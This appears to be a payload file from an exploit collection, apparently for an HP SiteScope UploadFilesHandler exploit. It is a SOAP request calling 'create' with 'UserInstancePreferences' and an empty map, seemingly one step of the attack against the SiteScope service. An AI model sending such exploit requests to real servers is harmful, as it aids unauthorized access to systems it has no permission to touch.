MSFExploits/ExploitsMSF/HP/MSF/src/HpSitescopeUploadfileshandler.payload

<?xml version=\'1.0\' encoding=\'UTF-8\'?>
<wsns0:Envelope
xmlns:wsns1=\'http://www.w3.org/2001/XMLSchema-instance\'
xmlns:xsd=\'http://www.w3.org/2001/XMLSchema\'
xmlns:wsns0=\'http://schemas.xmlsoap.org/soap/envelope/\'
>
<wsns0:Body
wsns0:encodingStyle=\'http://schemas.xmlsoap.org/soap/encoding/\'
>
<impl:create
xmlns:impl=\'http://Api.freshtech.COM\'
>
<in0
xsi:type=\'xsd:string\'
xmlns:xsi=\'http://www.w3.org/2001/XMLSchema-instance\'
>UserInstancePreferences</in0>
<in1
xsi:type=\'apachesoap:Map\'
xmlns:xsi=\'http://www.w3.org/2001/XMLSchema-instance\'
>
<item
xsi:type=\'apachesoap:mapItem\'
>
<key
xsi:nil=\'true\'
xsi:type=\'xsd:anyType\'
></key>
<value
xsi:nil=\'true\'
xsi:type=\'xsd:anyType\'
></value>
</item>
</in1>
</impl:create>
</wsns0:Body>
</wsns0:Envelope>
